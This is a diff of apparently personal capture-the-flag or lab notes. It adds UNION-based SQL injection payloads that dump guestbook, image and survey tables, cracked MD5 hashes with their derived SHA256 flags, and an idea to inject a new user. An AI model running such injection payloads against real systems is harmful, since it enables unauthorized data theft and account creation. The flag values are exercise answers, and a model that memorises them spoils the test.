@@ -64,6 +64,12 @@ TODO decrypt pw ! user 5
 !!!!!!!!!!!!!!!!!!!!!!!!
 !!!!!!!!!!!!!!!!!!!!!!!!
 
+	(flag ?)
+	5ff9d0165b4f92b14994e5c685cdce28
+	(md5 decode) -> FortyTwo
+	(lowercase) -> fortytwo
+	(sha256) -> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+
 
 
 ################################################################################
@@ -80,9 +86,27 @@ TODO check for shady shit
 
 
 
+################################################################################
+9 UNION SELECT id_comment, comment FROM Member_guestbook.guestbook
+	UNION SELECT id_comment, name FROM Member_guestbook.guestbook--
+>> dump_06*
 
+################################################################################
+9 UNION SELECT id, url FROM Member_images.list_images
+	UNION SELECT id, title FROM Member_images.list_images
+	UNION SELECT id, comment FROM Member_images.list_images--
+>> dump_07*
 
+	(flag ?)
+	1928e8083cf461a51303633093573c46
+	(md5 decode)-> albatroz
+	(sha256) -> f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
 
+################################################################################
+9 UNION SELECT id_vote, vote FROM Member_survey.vote_dbs
+	UNION SELECT id_vote, nb_vote FROM Member_survey.vote_dbs
+	UNION SELECT id_vote, subject FROM Member_survey.vote_dbs--
+>> dump_08*
 
 
 
@@ -91,3 +115,4 @@ check tables (from dump02)
 	GLOBAL_VARIABLES fields VARIABLE_NAME, VARIABLE_VALUE
 	USER_STATISTICS
 if able to inject data, try PARAMETERS table (maybe avoid escaping problems by using @)
+		try adding a user ?
